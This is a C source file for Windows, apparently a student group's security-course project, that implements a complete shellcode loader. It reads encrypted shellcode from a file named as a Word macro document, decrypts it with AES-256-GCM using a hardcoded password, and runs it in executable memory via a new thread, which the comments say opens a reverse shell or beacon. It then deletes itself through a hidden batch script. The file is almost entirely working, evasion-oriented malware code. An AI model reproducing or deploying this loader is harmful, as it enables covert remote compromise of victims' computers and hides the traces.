/*
 * AES-256-GCM Shellcode Loader with Memory Injection
 * 1. Read BT7.docm file (encrypted shellcode)
 * 2. Decrypt using AES-256-GCM
 * 3. Memory injection: VirtualAlloc -> memcpy -> VirtualProtect -> CreateThread
 * 4. Execute shellcode reverse shell
 */
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#pragma comment(lib, "bcrypt.lib")

// Encryption configuration
#define AES_KEY_SIZE 32      // AES-256
#define SALT_SIZE 16
#define NONCE_SIZE 12
#define TAG_SIZE 16
// Password for key derivation
const char* PASSWORD = "NT230_Group5_Key";
// Encrypted shellcode filename
const char* ENCRYPTED_FILE = "BT7.docm";
/*
 * Derive AES key from password using PBKDF2
 */
BOOL DeriveKeyFromPassword(
    const char* password,
    BYTE* salt,
    DWORD saltLen,
    BYTE* key,
    DWORD keyLen
) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    // Open SHA256 algorithm provider for PBKDF2
    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_SHA256_ALGORITHM,
        NULL,
        BCRYPT_ALG_HANDLE_HMAC_FLAG
    );
    
    if (!BCRYPT_SUCCESS(status)) {
        return FALSE;
    }

    // Derive key with PBKDF2
    status = BCryptDeriveKeyPBKDF2(
        hAlg,
        (PUCHAR)password,
        strlen(password),
        salt,
        saltLen,
        100000,
        key,
        keyLen,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}
/*
 * Decrypt AES-256-GCM using BCrypt API
 */
BOOL DecryptAESGCM(
    BYTE* encrypted,
    DWORD encryptedLen,
    BYTE* key,
    BYTE* nonce,
    BYTE** decrypted,
    DWORD* decryptedLen
) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    // Mở AES-GCM algorithm
    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        return FALSE;
    }

    // Set chaining mode to GCM
    status = BCryptSetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM),
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    // Import key
    status = BCryptGenerateSymmetricKey(
        hAlg,
        &hKey,
        NULL,
        0,
        key,
        AES_KEY_SIZE,
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    // Prepare auth info for GCM
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = NONCE_SIZE;
    authInfo.pbTag = encrypted + encryptedLen - TAG_SIZE;
    authInfo.cbTag = TAG_SIZE;

    // Allocate output buffer
    *decryptedLen = encryptedLen - TAG_SIZE;
    *decrypted = (BYTE*)VirtualAlloc(NULL, *decryptedLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*decrypted == NULL) {
        goto cleanup;
    }

    // Decrypt
    ULONG bytesDecrypted = 0;
    status = BCryptDecrypt(
        hKey,
        encrypted,
        encryptedLen - TAG_SIZE,
        &authInfo,
        NULL,
        0,
        *decrypted,
        *decryptedLen,
        &bytesDecrypted,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        VirtualFree(*decrypted, 0, MEM_RELEASE);
        *decrypted = NULL;
        goto cleanup;
    }

    *decryptedLen = bytesDecrypted;
    result = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}
/*
 * Read encrypted shellcode from file with retry logic
 */
BOOL ReadEncryptedFile(
    const char* filename,
    BYTE** salt,
    BYTE** nonce,
    BYTE** encrypted,
    DWORD* encryptedLen
) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    int retries = 10;
    int delay = 500;
    
    // Retry logic - wait for file to be ready
    for (int i = 0; i < retries; i++) {
        hFile = CreateFileA(
            filename,
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        
        if (hFile != INVALID_HANDLE_VALUE) {
            break;  // File opened successfully
        }
        
        // Wait before retry
        Sleep(delay);
    }

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize < SALT_SIZE + NONCE_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Allocate buffers
    *salt = (BYTE*)malloc(SALT_SIZE);
    *nonce = (BYTE*)malloc(NONCE_SIZE);
    *encryptedLen = fileSize - SALT_SIZE - NONCE_SIZE;
    *encrypted = (BYTE*)malloc(*encryptedLen);

    DWORD bytesRead;

    // Read salt
    if (!ReadFile(hFile, *salt, SALT_SIZE, &bytesRead, NULL)) {
        goto error;
    }

    // Read nonce
    if (!ReadFile(hFile, *nonce, NONCE_SIZE, &bytesRead, NULL)) {
        goto error;
    }

    // Read encrypted data
    if (!ReadFile(hFile, *encrypted, *encryptedLen, &bytesRead, NULL)) {
        goto error;
    }

    CloseHandle(hFile);
    return TRUE;
error:
    free(*salt);
    free(*nonce);
    free(*encrypted);
    CloseHandle(hFile);
    return FALSE;
}

/*
 * Memory Injection - Inject shellcode into memory and execute
 */
BOOL InjectAndExecuteShellcode(BYTE* shellcode, DWORD shellcodeLen) {
    DWORD oldProtect;
    // 1. VirtualAlloc - Allocate memory with EXECUTE_READWRITE permission
    LPVOID execMem = VirtualAlloc(
        NULL,
        shellcodeLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (execMem == NULL) {
        return FALSE;
    }
    // 2. Copy shellcode to memory
    memcpy(execMem, shellcode, shellcodeLen);
    // 3. CreateThread
    DWORD threadId;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)execMem,
        NULL,
        0,
        &threadId
    );
    if (hThread == NULL) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return FALSE;
    }
    // 4. Detach thread handle
    CloseHandle(hThread);
    return TRUE;
}
/*
 * Self-delete executable file
 */
BOOL SelfDelete() {
    char szModuleName[MAX_PATH];
    char szCmd[MAX_PATH * 2];
    char szBatchFile[MAX_PATH];
    // Get current executable path
    GetModuleFileNameA(NULL, szModuleName, MAX_PATH);
    // Create temp batch file
    GetTempPathA(MAX_PATH, szBatchFile);
    strcat(szBatchFile, "tmp_del.bat");
    // Create batch script to delete executable
    FILE* fp = fopen(szBatchFile, "w");
    if (fp == NULL) {
        return FALSE;
    }
    // Batch script: wait 2 seconds, delete exe, delete itself
    fprintf(fp, "@echo off\n");
    fprintf(fp, "timeout /t 2 /nobreak > nul\n");
    fprintf(fp, "del /f /q \"%s\" > nul 2>&1\n", szModuleName);
    fprintf(fp, "del /f /q \"%%~f0\" > nul 2>&1\n");
    fclose(fp);
    // Run batch file hidden
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    sprintf(szCmd, "cmd.exe /c \"%s\"", szBatchFile);
    if (!CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}
/*
 * Main entry point
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    BYTE* salt = NULL;
    BYTE* nonce = NULL;
    BYTE* encrypted = NULL;
    DWORD encryptedLen = 0;
    BYTE* shellcode = NULL;
    DWORD shellcodeLen = 0;
    BYTE key[AES_KEY_SIZE];
    // 1. Read encrypted shellcode from file
    if (!ReadEncryptedFile(ENCRYPTED_FILE, &salt, &nonce, &encrypted, &encryptedLen)) {
        return 1;
    }
    // 2. Derive key from password
    if (!DeriveKeyFromPassword(PASSWORD, salt, SALT_SIZE, key, AES_KEY_SIZE)) {
        goto cleanup;
    }
    // 3. Decrypt shellcode
    if (!DecryptAESGCM(encrypted, encryptedLen, key, nonce, &shellcode, &shellcodeLen)) {
        goto cleanup;
    }
    // 4. Inject and execute shellcode
    if (!InjectAndExecuteShellcode(shellcode, shellcodeLen)) {
        goto cleanup;
    }
    // Keep alive, then self-delete
    Sleep(10000);  // Wait 10 seconds for beacon to callback
    // Self-delete executable
    SelfDelete();
    // 5. Cleanup memory after injection (shellcode already copied to execMem)
    if (salt) free(salt);
    if (nonce) free(nonce);
    if (encrypted) free(encrypted);
    if (shellcode) VirtualFree(shellcode, 0, MEM_RELEASE);
    // Exit immediately - beacon will run in background thread
    return 0;
cleanup:
    // Cleanup memory
    if (salt) free(salt);
    if (nonce) free(nonce);
    if (encrypted) free(encrypted);
    if (shellcode) VirtualFree(shellcode, 0, MEM_RELEASE);
    return 1;
}
